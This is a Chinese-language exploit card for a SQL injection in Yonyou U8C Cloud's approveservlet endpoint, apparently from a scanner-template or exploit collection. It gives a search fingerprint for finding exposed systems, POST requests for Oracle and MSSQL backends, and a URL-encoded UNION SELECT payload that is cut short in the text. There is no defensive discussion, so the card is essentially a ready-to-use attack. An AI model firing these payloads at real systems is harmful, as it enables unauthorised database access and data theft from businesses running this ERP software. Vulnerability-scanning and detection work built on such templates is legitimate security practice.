# 用友-U8C-Cloudapproveservletsql注入

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="用友-U8-Cloud"`
- **请求**：`POST /service/approveservlet?oracle HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`id: yongyou-u8c-cloud-approveservlet-sqli`　`name: yongyou-u8c-cloud-approveservlet-sqli`　`author: HS`　`severity: high`

**请求体 / payload**
```
BILLID=123'&BILLTYPE=4331&USERID=3&RESULT=4&DATASOURCE=U8cloud
POST /service/approveservlet?mssql HTTP/1.1
Host:
Content-Type:application/x-www-form-urlencoded
BILLID=123%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28113%29%2BISNULL%28CAST%28111%2A111%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29…（脚本共 2744 字，完整版见原文）
```
- **预期**：200　|　—